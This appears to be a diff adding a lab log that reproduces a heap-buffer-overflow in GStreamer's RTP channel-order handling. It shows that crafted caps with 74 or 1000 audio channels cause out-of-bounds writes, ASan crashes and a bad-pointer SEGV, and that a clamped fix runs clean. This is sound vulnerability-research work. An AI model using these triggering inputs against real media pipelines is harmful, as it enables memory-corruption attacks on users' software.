@@ -1,0 +1,74 @@
+pinned upstream/channels.c 08ae20b33b764ce0a5f9e7e0e4d2b65cb3dc85e2b5bbee373218e817b75e577b
+pinned upstream/channels.h 0d239c5005ba2995d41a2b51b9b3d6ffe262357619d311af1ee0f0abf15eb6b4
+pinned upstream/audio-channels.h 3934f423cfcc7b9e190a1fb38e9b4317e0c1dcc62dbddc1d6dc28f22e0f1b5ec
+live_setcaps.c: In function ‘main’:
+live_setcaps.c:199:27: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
+  199 |     volatile gpointer v = ((LiveDepay *) dep)->order->pos;
+      |                           ^
+live_setcaps.c: In function ‘main’:
+live_setcaps.c:199:27: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
+  199 |     volatile gpointer v = ((LiveDepay *) dep)->order->pos;
+      |                           ^
+digest 8c7502f584b2e272be3bfbe6000792afa10ca285a96642268935481617b8bb45  live_setcaps.c
+digest 08ae20b33b764ce0a5f9e7e0e4d2b65cb3dc85e2b5bbee373218e817b75e577b  upstream/channels.c
+NOTE:   GST_AUDIO_CHANNEL_POSITION_NONE = -3,
+=== benign channels=8 (real order table hit, no create_default) ===
+sizeof(GstAudioInfo)=320 position_off_in_info=28
+sizeof(LiveDepay)=784 position_off_in_instance=484
+channels=8 oob_writes=0 escape_bytes=-268
+caps=application/x-rtp, media=(string)audio, clock-rate=(int)44100, encoding-name=(string)L16, encoding-params=(string)8, payload=(int)96
+setcaps_return=0 channels_field=8 order_ptr=0x621422064ab0
+rc=0
+=== vulnerable channels=74 (10 OOB writes, intra-object) ===
+sizeof(GstAudioInfo)=320 position_off_in_info=28
+sizeof(LiveDepay)=784 position_off_in_instance=484
+channels=74 oob_writes=10 escape_bytes=-4
+caps=application/x-rtp, media=(string)audio, clock-rate=(int)44100, encoding-name=(string)L16, encoding-params=(string)74, payload=(int)96
+
+** (live_vuln:3224696): WARNING **: 01:06:06.226: Unknown channel order '(NULL)' for 74 channels
+setcaps_return=0 channels_field=74 order_ptr=0xfffffffd
+rc=0
+=== VULNERABLE channels=1000 (expect ASan heap-buffer-overflow) ===
+sizeof(GstAudioInfo)=320 position_off_in_info=28
+sizeof(LiveDepay)=784 position_off_in_instance=484
+channels=1000 oob_writes=936 escape_bytes=3700
+caps=application/x-rtp, media=(string)audio, clock-rate=(int)44100, encoding-name=(string)L16, encoding-params=(string)1000, payload=(int)96
+==3224698==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x519000009060 at pc 0x5797cd67b100 bp 0x7fffccd9fde0 sp 0x7fffccd9fdd0
+WRITE of size 4 at 0x519000009060 thread T0
+    #0 0x5797cd67b0ff in gst_rtp_channels_create_default upstream/channels.c:309
+    #1 0x5797cd67a27a in live_setcaps /home/mesh-home/mishe-tauftauf2shell/lab/gst2shell-src/live_setcaps.c:132
+    #2 0x5797cd67a74a in main /home/mesh-home/mishe-tauftauf2shell/lab/gst2shell-src/live_setcaps.c:194
+0x519000009060 is located 0 bytes after 992-byte region [0x519000008c80,0x519000009060)
+allocated by thread T0 here:
+    #0 0x7fbd228fd340 in calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:77
+    #1 0x7fbd225c7821 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x63821) (BuildId: 32e71bdc4300e9f407c74441d1b02d962c8af007)
+    #2 0x7fbd22f55f65 in g_type_create_instance (/lib/x86_64-linux-gnu/libgobject-2.0.so.0+0x40f65) (BuildId: 7f05f3309a67e3e14d21138004573cb76a1cd904)
+    #4 0x7fbd22f3d015 in g_object_new_with_properties (/lib/x86_64-linux-gnu/libgobject-2.0.so.0+0x28015) (BuildId: 7f05f3309a67e3e14d21138004573cb76a1cd904)
+    #5 0x7fbd22f3df70 in g_object_new (/lib/x86_64-linux-gnu/libgobject-2.0.so.0+0x28f70) (BuildId: 7f05f3309a67e3e14d21138004573cb76a1cd904)
+SUMMARY: AddressSanitizer: heap-buffer-overflow upstream/channels.c:309 in gst_rtp_channels_create_default
+vuln_rc=1
+=== FIXED control channels=1000 (MIN clamp, expect clean) ===
+sizeof(GstAudioInfo)=320 position_off_in_info=28
+sizeof(LiveDepay)=784 position_off_in_instance=484
+channels=1000 oob_writes=936 escape_bytes=3700
+caps=application/x-rtp, media=(string)audio, clock-rate=(int)44100, encoding-name=(string)L16, encoding-params=(string)1000, payload=(int)96
+
+** (live_fixed:3224707): WARNING **: 01:06:06.338: Unknown channel order '(NULL)' for 1000 channels
+setcaps_return=0 channels_field=1000 order_ptr=(nil)
+fixed_rc=0
+=== VULN channels=74 + deref order->pos (pinned depay.c:267) ===
+channels=74 oob_writes=10 escape_bytes=-4
+caps=application/x-rtp, media=(string)audio, clock-rate=(int)44100, encoding-name=(string)L16, encoding-params=(string)74, payload=(int)96
+setcaps_return=0 channels_field=74 order_ptr=0xfffffffd
+==3224708==ERROR: AddressSanitizer: SEGV on unknown address 0x00009fff8001 (pc 0x5e964d36a8a4 bp 0x7ffd51b67d30 sp 0x7ffd51b67c20 T0)
+==3224708==The signal is caused by a READ memory access.
+    #0 0x5e964d36a8a4 in main /home/mesh-home/mishe-tauftauf2shell/lab/gst2shell-src/live_setcaps.c:199
+SUMMARY: AddressSanitizer: SEGV /home/mesh-home/mishe-tauftauf2shell/lab/gst2shell-src/live_setcaps.c:199 in main
+deref_vuln_rc=1
+=== benign channels=8 + deref (real order, clean) ===
+setcaps_return=0 channels_field=8 order_ptr=0x6399b4684ab0
+deref_order_pos=0x6399b4682b20
+deref_benign_rc=0
+=== FIXED channels=74 + deref (order NULL, clean) ===
+setcaps_return=0 channels_field=74 order_ptr=(nil)
+deref_fixed_rc=0
